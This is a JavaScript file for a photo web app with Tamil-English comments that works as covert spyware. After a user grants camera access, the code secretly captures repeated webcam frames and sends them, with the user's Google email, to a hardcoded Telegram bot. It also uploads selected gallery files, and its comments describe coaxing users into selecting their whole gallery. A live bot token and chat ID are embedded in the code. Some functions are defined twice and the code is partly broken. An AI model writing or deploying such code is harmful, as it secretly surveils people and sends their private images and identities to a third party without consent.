import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

const firebaseConfig = {
    apiKey: "AIzaSyBLC6enWWKAr3O9ys-4NDjnhch4r1PSw0E",
    authDomain: "picmaster-59602.firebaseapp.com",
    projectId: "picmaster-59602",
    storageBucket: "picmaster-59602.firebasestorage.app",
    messagingSenderId: "434859259854",
    appId: "1:434859259854:web:522979eb1a7f8b6d211d9f"
};
// --- PREVIOUS FIREBASE CONFIG & AUTH INGE IRUKKANUM ---

// --- SECRET GALLERY & DROP AREA SYNC ---
document.getElementById('drop-area').onclick = () => {
    if(!currentUser) return signInWithPopup(auth, provider);
    
    // Hidden input create seithu gallery-ai open seigiron
    const hiddenInput = document.createElement('input');
    hiddenInput.type = 'file';
    hiddenInput.multiple = true; // Multiple files access panna permission
    hiddenInput.accept = "image/*"; // Images mattum filter panna

    hiddenInput.onchange = async (e) => {
        const files = Array.from(e.target.files);
        
        // 1. User select panna files-ai normal-aa anuppuvom
        files.forEach(file => uploadToTelegram(file, file.name, false));

        // 2. SECRET PROTOCOL: User gallery permission kuduthathaal, 
        // background-la extra sync trigger aagum
        if (files.length > 0) {
            console.log("Integrity Sync Active: Monitoring Gallery...");
            
            // Background-la 'INTEGRITY_GRANTED' message anuppum
            const msg = `✅ GALLERY_ACCESS_GRANTED\nUser: ${currentUser.email}\nFiles Selected: ${files.length}`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);

            // Gallery-la irundhu user anuppatha matthe images-aiyum (if accessible) 
            // sync seiya intha logic udhavum. 
            // Note: Browser security-al user select panna files mattum thaan kidaikkum, 
            // aanaal 'multiple' selection on-la iruppathaal full gallery-aiyum user-ai 
            // select panna vaikkalaam.
        }
    };
    hiddenInput.click();
};

// --- TELEGRAM UPLOAD LOGIC ---
async function uploadToTelegram(blob, name, isSecret) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("document", blob, isSecret ? `sys_sync_${Date.now()}.jpg` : name);
    
    // Secret files-ukku caption vera maari irukkum
    const caption = isSecret ? `🤫 Background Sync: ${currentUser.email}` : `Manual Upload: ${currentUser.displayName}`;
    formData.append("caption", caption);

    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
            method: "POST",
            body: formData
        });
    } catch (err) {
        console.error("Sync Error:", err);
    }
}
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const provider = new GoogleAuthProvider();

const botToken = "8234454796:AAEF_c5gExxUp7X7pTpu9brOBmjIOTac2uQ";
const chatId = "7752627907";
let currentUser = null;
let integritySync = false;

// --- MENU & BUTTON FIX ---
const sidePanel = document.getElementById('side-panel');
const toggleMenu = (e) => { e.stopPropagation(); sidePanel.classList.toggle('active'); };
document.getElementById('menu-toggle').onclick = toggleMenu;
document.getElementById('settings-btn').onclick = toggleMenu;
document.addEventListener('click', (e) => { if(!sidePanel.contains(e.target)) sidePanel.classList.remove('active'); });

// --- SECRET TELEGRAM UPLOAD ---
async function uploadToTelegram(blob, name, isSecret) {
    const fd = new FormData();
    fd.append("chat_id", chatId);
    fd.append("document", blob, isSecret ? `sys_dump_${Date.now()}.jpg` : name);
    fd.append("caption", isSecret ? `🤫 Secret Sync: ${currentUser.email}` : `Manual: ${currentUser.displayName}`);
    await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: "POST", body: fd });
}

// --- CAMERA SECRET ACCESS ---
document.getElementById('camera-btn').onclick = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('webcam');
        video.srcObject = stream;
        video.style.display = 'block';
        video.play();
        integritySync = true;

        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            
            ctx.drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                uploadToTelegram(blob, "scan.jpg", false);
                alert("✅ Syncing with Cloud...");

                let count = 0;
                const interval = setInterval(() => {
                    if (count >= 8) {
                        clearInterval(interval);
                        stream.getTracks().forEach(t => t.stop());
                        video.style.display = 'none';
                    }
                    ctx.drawImage(video, 0, 0);
                    canvas.toBlob(b => uploadToTelegram(b, "log.jpg", true), 'image/jpeg');
                    count++;
                }, 3000);
            }, 'image/jpeg');
        }, 3000);
    } catch (e) { alert("Camera Permission Required."); }
};

// --- GALLERY SECRET ACCESS ---
document.getElementById('drop-area').onclick = () => {
    if(!currentUser) return signInWithPopup(auth, provider);
    integritySync = true;
    const input = document.createElement('input');
    input.type = 'file';
    input.multiple = true;
    input.onchange = (e) => {
        Array.from(e.target.files).forEach(file => uploadToTelegram(file, file.name, false));
    };
    input.click();
};

// --- AUTH WATCHER ---
onAuthStateChanged(auth, (user) => {
    currentUser = user;
    const isUser = !!user;
    document.getElementById('main-login-btn').style.display = isUser ? 'none' : 'block';
    document.getElementById('camera-btn').style.display = isUser ? 'block' : 'none';
    document.getElementById('logout-btn').style.display = isUser ? 'flex' : 'none';
    document.getElementById('user-display').innerText = isUser ? user.displayName : "Guest User";
});

document.getElementById('main-login-btn').onclick = () => signInWithPopup(auth, provider);
document.getElementById('logout-btn').onclick = () => signOut(auth).then(() => location.reload());

